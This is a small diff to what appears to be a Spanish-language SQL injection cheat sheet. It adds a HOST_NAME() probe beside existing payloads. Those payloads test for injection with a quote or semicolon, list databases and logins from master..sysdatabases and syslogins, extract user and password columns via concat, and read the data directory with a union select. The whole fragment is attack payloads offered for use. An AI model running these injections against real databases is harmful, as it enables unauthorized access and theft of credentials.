@@ -216,6 +216,7 @@ Ponemos ' o ; y si es vulnerable, a probar
 	SELECT name FROM master..sysdatabases --
 	name FROM master..syslogins -- // name FROM master.sys.sql_logins -- 
 	user_name() -- // system_user -- // user -- 
+	HOST_NAME() -- 
     
     También concat(user,0x3a,password) from 'users' Para acceder a campos internos
 ' union select 1, @@datadir # Para obtener el directorio de la base de datos, y si es mysql por ejemplo
